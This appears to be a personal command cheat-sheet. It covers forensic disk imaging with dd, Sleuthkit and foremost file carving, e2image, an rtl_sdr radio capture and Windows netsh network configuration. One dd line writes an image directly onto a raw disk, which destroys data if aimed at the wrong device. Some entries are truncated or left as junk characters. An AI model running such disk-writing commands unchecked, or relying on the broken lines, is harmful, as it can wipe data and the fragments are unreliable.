dd if=/mnt/recovery/$File.raw of=/dev/hdb


dd if=/dev/hda1 of=/mnt/hdb1/$File.img



##-=========================================================-##
##   [+] Monitor The Progress of The Image Being Created:
##-=========================================================-##
watch ls -l /mnt/sdb1/$File.img




The Sleuthkit Command-line tools:
• ils lists inode information from the image.
• ffind finds the file or directory name using the inode.
• icat outputs the file content based on its inode number.



##-=========================================================-##
##   [+] output to the directory from where you ran it:
##-=========================================================-##
foremost $File.dd

##-====================================================-##
##   [+] write them to a specified output directory:
##-====================================================-##
foremost -t all -o /rescue/dir -i $File.dd


##-=========================================================-##
##   [+] Search jpeg format skipping the first 100 blocks
##-=========================================================-##
foremost -s 100 -t jpg -i $File.dd

##-===========================================-##
##   [+] Only generate an audit file,
##   [?] print to the screen (verbose mode)
##-===========================================-##
foremost -av $File.dd

##-=================================-##
##   [+] Search all defined types:
##-=================================-##
foremost -t all -i $File.dd

##-=================================-##
##   [+] Search for gif and pdf's:
foremost -t gif,pdf -i $File.dd


##-====================================================-##
##   [+] Search for office documents and jpeg files
in a Unix file system in verbose mode.:
##-====================================================-##
foremost -vd -t ole,jpeg -i $File.dd

##-==============================-##
##   [+] Run the default case:
##-==============================-##
foremost $File.dd



##-=================================-##
##   [+] 
##-=================================-##
e2image -r /dev/hda1 - | bzip2 > hda1.e2i.bz2










tune to 392.0 MHz, and set the sample-rate to 1.8 MS/s, use:

rtl_sdr /tmp/capture.bin -s 1.8e6 -f 392e6



























netsh int ipv6 show interfaces
powershell -command "get-netadapter"


netsh interface show interface



netsh interface ip set dnsserver name="Local Area Connection"
static 10.10.10.85 primary


set an IP address, we could just run the command:
C:\> netsh interface ip set address name="Local Area Connection"
static 10.10.10.10 255.255.255.0 10.10.10.1 1


DHCP, we simply run:
C:\> netsh interface ip set z







ccccccccccccccccccccccccc
